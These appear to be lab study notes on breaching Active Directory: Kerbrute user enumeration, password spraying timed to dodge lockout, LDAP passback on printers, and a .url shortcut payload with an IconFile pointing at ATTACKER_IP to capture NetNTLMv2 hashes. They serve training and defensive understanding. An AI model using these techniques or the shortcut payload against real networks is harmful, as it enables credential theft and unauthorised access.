# Additional Technical Notes: Intro to AD Breaching

---

## 1. Deep Dive: Kerberos Pre-Authentication Enumeration Mechanics

`Kerbrute` exploits the Kerberos Authentication Service exchange (`AS-REQ` / `AS-REP`) defined in RFC 4120.

### Protocol Handshake Error Codes:
When an unauthenticated client transmits an `AS-REQ` (packet type 10) specifying a realm and client principal name:
1. **Invalid User:**
   * The KDC searches the domain partition of `NTDS.dit`.
   * When the username does not exist, the KDC responds with an `AS-ERROR` (packet type 30) containing:
     $$\text{error-code: } 6 \rightarrow \text{KDC\_ERR\_C\_PRINCIPAL\_UNKNOWN}$$
2. **Valid User (Pre-Authentication Required):**
   * The user exists, and standard pre-authentication is enforced (the default for all Windows domain accounts).
   * The KDC returns `AS-ERROR` containing:
     $$\text{error-code: } 25 \rightarrow \text{KDC\_ERR\_PREAUTH\_REQUIRED}$$
3. **Valid User (Pre-Authentication NOT Required):**
   * If the account has `DONT_REQ_PREAUTH` enabled, the KDC immediately responds with an `AS-REP` containing the encrypted TGT (opening the door to **AS-REP Roasting**).

### Lockout Immunity Mechanism:
* Active Directory increments the `badPwdCount` attribute only when an invalid password hash is submitted within an `AS-REQ` authenticator.
* Because Kerbrute's `userenum` mode does not submit an encrypted authenticator (it only requests pre-authentication requirements), **no bad password attempt is recorded**, ensuring total immunity from account lockout policies.

---

## 2. Password Spraying Operational Architecture

### Lockout Calculation Formula:
Before spraying, operators parse the domain lockout policy:
$$\text{Safe Batch Size} = \text{LockoutThreshold} - 1$$
$$\text{Interval Window} = \text{LockoutObservationWindow} + \text{Safety Buffer (e.g. 5 mins)}$$

For example, if Lockout Threshold = 5 and Observation Window = 30 minutes:
* Maximum 4 passwords per account per 35-minute cycle.
* Spraying 100 accounts with 1 password = 100 total authentication attempts, but exactly 1 attempt per account.

---

## 3. Coercion Internals: LDAP Passback & UNC File Paths

### A. LDAP Passback Vulnerability:
* Embedded devices (network printers, VoIP phones, NAS units) store LDAP credentials for directory lookups.
* Many vendor web consoles allow specifying arbitrary server IP addresses and ports without validating server certificates (Cleartext LDAP / Simple Bind over TCP port 389).
* When "Test Connection" is clicked, the device opens a raw TCP socket to the attacker's IP and sends an LDAP `BindRequest` frame containing:
  - `version: 3`
  - `name: CN=svc.ldap,OU=Service Accounts,DC=thm,DC=loc`
  - `authentication: simple (password: Pr1ntBind2025!)`

### B. UNC Shortcut Auto-Rendering:
* Windows Explorer automatically parses the metadata of files inside open SMB folders.
* In `.url` (Internet Shortcut) and `.scf` (Shell Command File) structures:
  ```ini
  [InternetShortcut]
  URL=http://localhost
  IconFile=\\ATTACKER_IP\share\icon.ico
  IconIndex=1
  ```
* When an employee views the share, Windows invokes WebDAV and SMB client redirectors (`mrxsmb.sys`) to retrieve the icon from `\\ATTACKER_IP`, automatically submitting the calling user's NetNTLMv2 challenge-response to the listener.
